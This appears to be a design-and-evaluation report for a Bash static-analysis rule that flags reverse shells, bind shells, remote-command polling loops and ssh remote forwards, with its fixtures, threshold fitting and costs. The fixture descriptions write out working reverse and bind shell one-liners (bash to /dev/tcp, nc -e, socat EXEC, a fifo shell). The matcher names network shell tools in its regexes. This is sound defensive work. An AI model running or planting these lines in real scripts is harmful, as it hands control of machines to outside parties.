# takes-remote-commands (Bash)

## Rule

```yaml
id: takes-remote-commands
language: Bash
kind: noul
# The construct, not the script. "Is this script malicious" is a question about
# a whole program's intent; "does this line leave a channel somebody else can
# drive" is a question about the text under it, with the rest of the file in the
# state to say which way the commands are travelling.
subject: node
state: located
# 0.50, fitted 2026-09-21 on the fixtures beside it (17 subjects: 6 defects,
# 11 cleans of which 9 hard, 3 passes). Cleans top out at 0.23 -- the `mkfifo`
# four lines above a reverse shell, which the model reads as part of the defect
# but not as the construct that takes the commands -- and the next cleans down
# are the `socat` port-forward and the detached `nohup socat TCP-LISTEN ...
# UNIX-SENDTO:/dev/log` relay, both at 0.13, the queue worker whose remote
# response only supplies `--job` and `--profile` at 0.11, and `ssh host 'cmd'`
# at 0.04. Defects start at 0.79 (`remote_helper.sh`, the reverse shell assembled
# out of a fifo, `/bin/sh -i` and `nc` with no `-e` anywhere); the other five are
# 0.88 and up. Midpoint of a gap 0.56 wide, 0.27 of headroom below and 0.29
# above, no decision flips over three passes, max pass-to-pass spread 0.04. The
# first guess, 0.70, gave the same decisions -- the gap is wide enough that any
# cutoff in it does.
threshold: 0.50
axis: file
severity: warning
# Five places a shell meets a socket, over-matched on purpose: the tools that
# can carry a channel (`nc -z` the probe and `nc -e` the shell are both in,
# `ssh host 'cmd'` and `ssh -R` are both in), the same tools behind a detaching
# wrapper, anything redirected to or from `/dev/tcp`, and a loop that talks to
# the network at all -- the health poll, the queue worker and the C2 beacon are
# the same three lines in a different order. What the model decides is which end
# of the channel picks the commands.
#
# Two tree-sitter-bash facts shape this. `nohup ssh -R ...` and `setsid nc -e
# ...` have command_name `nohup`/`setsid`; the tool is an ARGUMENT word, so the
# name regex alone never sees the detached shapes this rule most cares about --
# hence the wrapper branch. And the branches nest: `nc ... >& /dev/tcp/h/2` is a
# redirected_statement AROUND a matching command, `while ...; done > /dev/tcp/h/9`
# one around a matching loop, each of which reported the same line twice. The
# redirect branch stands down when it already contains a match, so the finding
# lands on the construct and not on its wrapper.
utils:
  channelTool:
    kind: command
    has:
      field: name
      regex: "^(nc|ncat|netcat|socat|telnet|openssl|ssh|autossh|mkfifo|screen|tmux)$"
  wrappedChannelTool:
    kind: command
    all:
      - has: { field: name, regex: "^(nohup|setsid|disown|nice|timeout|env|stdbuf|daemonize)$" }
      - has: { field: argument, regex: "^(nc|ncat|netcat|socat|telnet|ssh|autossh|screen|tmux)$" }
  networkLoop:
    kind: while_statement
    has:
      stopBy: end
      kind: command
      has: { field: name, regex: "^(curl|wget|nc|ncat|netcat|socat|ssh|telnet|openssl|aws|redis-cli)$" }
rule:
  any:
    - matches: channelTool
    - matches: wrappedChannelTool
    - matches: networkLoop
    - all:
        - kind: redirected_statement
        - regex: "/dev/(tcp|udp)/"
        - not:
            has:
              stopBy: end
              any:
                - matches: channelTool
                - matches: wrappedChannelTool
                - matches: networkLoop
ask: >-
  This construct leaves the machine running the script taking commands from
  somewhere else: a shell another host can reach, or a loop that executes
  whatever a remote host hands back.
criteria:
  "true": >-
    What this establishes is a channel, and the commands that run on this machine
    through it are chosen at the far end. A shell attached to a socket -- `nc` or
    `ncat` with `-e`, `bash -i` redirected to `/dev/tcp/...`, `socat` with `EXEC:`
    or `SYSTEM:`, a fifo with a shell on one side and a network tool on the other
    -- is this case; so is a remote forward, a listener or a detached session that
    leaves this box's shell reachable with no operator at the keyboard; so is a
    loop that fetches a response and runs it, whatever the interpreter. The host it
    dials may be named after the company and the line may sit among ordinary
    administration; the question is only who chooses what runs here.
  "false": >-
    Either this machine is the one issuing the commands -- `ssh host 'systemctl
    restart app'` sends a command that is written in this script OUT to a named
    host, which is the mirror image of the defect, not the defect -- or what
    crosses the channel is data: a port probe, a port forwarded so a local program
    can reach a database, a certificate read off a server, a loop that compares the
    response to a string, a fifo joining two local programs, a detached session
    running a script that is already on this machine. A response that supplies an
    identifier, a profile name or a filename passed as an ARGUMENT to a program
    this machine already has is data too -- the remote end choosing what a fixed
    local program is given is not the remote end choosing the program.
note: >-
  A channel, not a download. The sibling rule `runs-downloaded-code` owns the
  one-shot -- `curl | sh` in an installer, an `eval` of a fetched blob, a dropper
  that chmods and runs -- where bytes arrive once and the script moves on. This
  rule is about something that keeps taking instructions, or that hands this
  machine's shell to whoever is on the other end: a loop that fetches and executes
  every minute is this case even though one turn of it would be the sibling's, and
  a reverse shell is this case with nothing downloaded at all. A line that runs a
  payload once and opens nothing is not this rule's; do not report it here.
  Direction settles most of it. `ssh -R` publishes this host's port on somebody
  else's machine; `ssh -L`, `ssh -D` and `ssh host 'cmd'` do not. `nc -z` probes,
  `nc -e` serves. `socat` moving bytes between two addresses forwards; `socat`
  with `EXEC:` or `SYSTEM:` serves. `screen -dmS` and `tmux new-session -d` are
  this case only when what they hold is an interactive shell or something dialled
  out, not a script from this machine. An internal-looking hostname, a variable
  named after support or ops, a comment explaining why the channel is needed, and
  `set -euo pipefail` establish nothing.
explain:
  reverse_shell: Opens a reverse shell or remote-command channel.
  c2_poll: Polls a host for commands and executes whatever comes back.
  unattended_rpc: Exposes an unauthenticated or hidden RPC that runs OS commands.
```

## Corpus

17 subjects the matcher finds, in 15 files: **6 bad**, **11 clean**, of which 9
are hard -- the same construct, the same tool, done legitimately.

The bad cases:

- `support_bundle.sh:20` -- `bash -i >& "/dev/tcp/$RELAY/$RELAY_PORT" 0>&1 &`
  at the end of a real diagnostics-bundle script. A reverse shell; the comment
  above it ("leave support a way in while the ticket is open") is the excuse.
- `node_agent.sh:18` -- a `while true` loop that GETs a task from the fleet
  controller every 60s, runs it through `/bin/sh -c`, and POSTs the output
  back. The far end picks every command; the registration call above it is real.
- `metrics_shipper.sh:21` -- `socat TCP:"$GW":"$GW_PORT" EXEC:'/bin/bash -li',pty
  ... &`, bolted onto a metrics script that otherwise does exactly what it says.
- `remote_helper.sh:16` -- `cat "$PIPE" | /bin/sh -i 2>&1 | nc "$HOST" "$PORT" >
  "$PIPE"`. A reverse shell assembled out of a fifo, with no `-e` anywhere.
- `provision_hook.sh:16` -- `ssh -f -N -R "0.0.0.0:2022:localhost:22"` to a
  gateway, detached, `StrictHostKeyChecking=no`. This box's sshd published on
  somebody else's machine, with no operator.
- `debug_listener.sh:16` -- `setsid nc -l -k -p "$PORT" -e /bin/bash >/dev/null
  2>&1 &`. A bind shell that re-listens after every client, behind a real
  feature flag and a real `sysctl` line.

The hard cleans, each the mirror of a bad case: `deploy.sh:14` (`ssh host
'<command written in this script>'` -- commands going OUT), `worker.sh:15` (a
forever loop polling a queue where the response only supplies `--job` and
`--profile` to a fixed local renderer), `wait_for_health.sh:8` (an `until` loop
that compares the response to a string), `preflight.sh:11` (`nc -z` probe),
`migrate.sh:8` (`socat` forwarding a local port to a database), `syslog_relay.sh:14`
(`nohup socat TCP-LISTEN:...,fork UNIX-SENDTO:/dev/log &` -- every surface flag
of the bind shell, with the journal behind the listener instead of bash),
`nightly.sh:15` (`screen -dmS` holding a chores script from this machine),
`stream_dump.sh:8` (a fifo joining `pg_dump` to `sha256sum`), and
`remote_helper.sh:12` -- the `mkfifo` four lines above the reverse shell, in the
file the state carries whole. That last one is the corpus's real cutoff-setter.

## Attempts

1. **`subject: node`, `state: located`, sentence as shipped, `threshold: 0.7`** --
   `gaps`: **works**, gap **0.58**, head **+0.48**, suggest 0.51. Separated on
   the first sentence; no rewrite was needed.
2. **Same sentence, one corpus correction.** The first `eval` put
   `remote_helper.sh:12` (the `mkfifo`) at 0.25 against a `bad` label -- the only
   miss. Re-read: the label was wrong, not the answer. `mkfifo -m 600 "$PIPE"`
   creates a named pipe and takes commands from nobody; the construct that takes
   them is the pipeline four lines down. The template labels the `chmod +x` and
   not the `wget` above it for the same reason -- one construct per defect.
   Relabelled `clean`, where it became the hardest clean in the corpus at 0.23.
   `gaps`: **works**, gap **0.56**, head +0.26 at the fitted cutoff.
3. **Same sentence, matcher hardened, corpus +2.** A free probe (a scratch file,
   not the fixtures) showed `nohup ssh -N -R ...` and `setsid nc -e ...` matching
   *nothing*, and `nc ... >& /dev/tcp/h/2` matching *twice*. Added a wrapper
   branch and a nesting guard (below), plus two fixtures that exercise them --
   `debug_listener.sh` (bad, and the corpus's only `unattended_rpc` case) and
   `syslog_relay.sh` (hard clean). `gaps`: **works**, gap **0.56**, head **+0.26**,
   suggest 0.52. Fit unchanged: the sentence never moved.

## Fit

Fitted cutoff **0.50** (midpoint 0.51-0.53 across runs; rounded down).

| | |
| --- | --- |
| precision | **1.00** |
| recall | **1.00** |
| tp / fp / fn | **6 / 0 / 0** |
| decision flips over 3 passes | **0** |
| max pass-to-pass spread | **0.04** |
| cleanTop | **0.23** |
| defect floor | **0.79** |
| gap | **0.56** (0.27 headroom below, 0.29 above) |

Three passes, mean per subject:

```
clean 0.02  cert_check.sh:11        openssl x509 parsing the response
clean 0.02  preflight.sh:11         nc -z port probe
clean 0.03  cert_check.sh:10        openssl s_client reading a certificate
clean 0.03  stream_dump.sh:8        mkfifo joining pg_dump to sha256sum
clean 0.03  wait_for_health.sh:8    until-loop comparing the response to a string
clean 0.04  deploy.sh:14            ssh host '<command written here>'
clean 0.04  nightly.sh:15           screen -dmS holding a local chores script
clean 0.11  worker.sh:15            queue worker: response -> arguments only
clean 0.13  syslog_relay.sh:14      nohup socat TCP-LISTEN ... UNIX-SENDTO:/dev/log
clean 0.13  migrate.sh:8            socat forwarding a local port to a database
clean 0.23  remote_helper.sh:12     mkfifo four lines above a reverse shell
-------------------------------------------------- cutoff 0.50
bad   0.79  remote_helper.sh:16     reverse shell out of a fifo, no -e
bad   0.88  provision_hook.sh:16    ssh -f -N -R, detached, host-key check off
bad   0.94  metrics_shipper.sh:21   socat ... EXEC:'/bin/bash -li',pty
bad   0.97  node_agent.sh:18        while true: fetch a task, sh -c it, post the output
bad   0.97  support_bundle.sh:20    bash -i >& /dev/tcp/$RELAY/$PORT
bad   0.97  debug_listener.sh:16    setsid nc -l -k -e /bin/bash
```

## Verdict

**SHIP.** Precision and recall 1.00 at 0.50 with 0.27 of headroom below and 0.29
above, no flips over three passes, and the two cases built to break it -- the
queue worker whose remote response chooses arguments (0.11) and the detached
listening `socat` relay (0.13) -- are answered on the right side by a wide
margin, as is `ssh host 'cmd'` at 0.04.

## What I would change

- **cleanTop is contamination, not difficulty.** Every clean I designed as hard
  landed at 0.13 or below; the highest was a *neutral* construct (`mkfifo`) four
  lines above a defect in the same file, at 0.23. On `state: located` the file
  bleeds into the verdict, so the cutoff is set by proximity, not by the
  construct. Every rule in this pack should carry one adjacent-to-a-defect clean
  or its headroom is overstated.
- **Two tree-sitter-bash traps cost real coverage**, both found free and both now
  guarded in the matcher (see its comment): a detaching wrapper takes the
  command_name, so `nohup ssh -R` / `setsid nc -e` are invisible to a name regex;
  and `command`, `while_statement` and `redirected_statement` nest, so
  `nc ... >& /dev/tcp/h/2` and `while ...; done > /dev/tcp/h/9` each reported one
  line twice. Neither showed up on the fixtures -- only on a probe file written
  to attack the matcher. Write one.
- **The corpus has no case where the direction is genuinely ambiguous**: a
  bastion that both accepts and issues, or an `ssh -R` a team really does run on
  purpose. Direction is the whole sentence, and it is never close here. If this
  ships, that is the first real file to check it against.
- `openssl` in the tool list earns little: `openssl s_client | openssl x509` is
  two subjects on two lines for one certificate read, both trivially clean. It
  stays for the `openssl s_client | sh` shape, but it is the branch most likely
  to be noise on a real repository.

## Cost

Six paid runs, all on the 15-file corpus; every matcher iteration was done on
`--dry-run --show-subjects`, which is free.

| run | requests | input tokens | $ |
| --- | --- | --- | --- |
| `gaps` (attempt 1) | 13 | ~19,600 | 0.00086 |
| `eval --repeat 1` | 13 | ~19,600 | 0.00086 |
| `eval --repeat 3` (15 subjects) | 39 | 61,242 | 0.00257 |
| `eval --repeat 3` (17 subjects) | 45 | 69,417 | 0.00292 |
| `eval --repeat 3 --accept` | 45 | 69,417 | 0.00292 |
| `gaps` (final reading) | 15 | ~22,100 | ~0.00093 |
| **total** | **170** | **~261,000** | **~$0.011** |

Well inside the $0.10 budget. A single 3-pass `eval` over this corpus is $0.003.
